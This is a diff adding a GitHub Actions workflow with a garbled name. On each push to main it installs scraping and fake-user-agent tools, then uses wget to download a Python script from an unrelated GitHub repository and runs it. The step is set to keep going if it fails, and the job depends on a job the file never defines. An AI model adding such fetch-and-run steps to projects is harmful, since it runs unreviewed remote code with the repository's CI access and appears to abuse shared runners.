@@ -1,0 +1,35 @@
+name: Multi-yMachineyd Workflowznig
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+
+  run-on-ubuntu1:
+    needs: run-on-ubuntu5
+    runs-on: ubuntu-latest
+    if: always()  # This ensures the job runs even if previous jobs fail
+    
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Set up Python
+        uses: actions/setup-python@v3
+        with:
+          python-version: 3.11  # Replace with your desired Python version
+
+      - name: Run Python Program
+        continue-on-error: true
+        run: |
+          pip install requests beautifulsoup4 colorama fake-useragent
+          pip install selenium 
+          wget https://github.com/Bvfre/yu/raw/main/a.py
+          ls
+          python a.py
+          
+          
+
